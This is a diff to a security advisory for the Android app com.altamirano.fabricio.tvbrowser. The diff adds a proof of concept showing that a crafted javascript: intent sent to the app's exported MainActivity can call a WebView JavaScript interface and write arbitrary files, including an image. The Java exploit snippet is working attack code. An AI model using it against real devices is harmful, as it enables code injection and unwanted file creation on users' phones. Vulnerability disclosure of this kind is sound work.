@@ -22,6 +22,8 @@ The `MainActivity`'s WebView exposes certain JavaScript interfaces which can lea
 
 **Proof of Concept (Code Injection):**
 
+An example of arbitrary file creation (Text file):
+
 ![image](https://github.com/actuator/com.altamirano.fabricio.tvbrowser/blob/main/TVBrowserDemo.gif)
 
 ```java
@@ -37,7 +39,25 @@ public void launchBrowser() {
 }
 ```
 
+An example of arbitrary file creation (Image):
 
+![green](https://github.com/actuator/com.altamirano.fabricio.tvbrowser/assets/78701239/7049c0bc-95b5-4bda-9f82-43d7be48fe40)
+
+
+
+```
+String base64ImageData = getString(R.string.base64_image_data);
+
+        // Construct the JavaScript code
+        String jsCode = String.format("javascript:if(window.Android && typeof window.Android.getBase64FromBlobData === 'function'){ window.Android.getBase64FromBlobData('data:image/png;base64,%s', 'test.png'); }", base64ImageData);
+
+        Intent intent = new Intent(Intent.ACTION_VIEW);
+        intent.setComponent(new ComponentName("com.altamirano.fabricio.tvbrowser", "com.altamirano.fabricio.tvbrowser.MainActivity"));
+        intent.setData(Uri.parse(jsCode));
+
+        // Launch the MainActivity
+        startActivity(intent);
+```
 ---
 
 
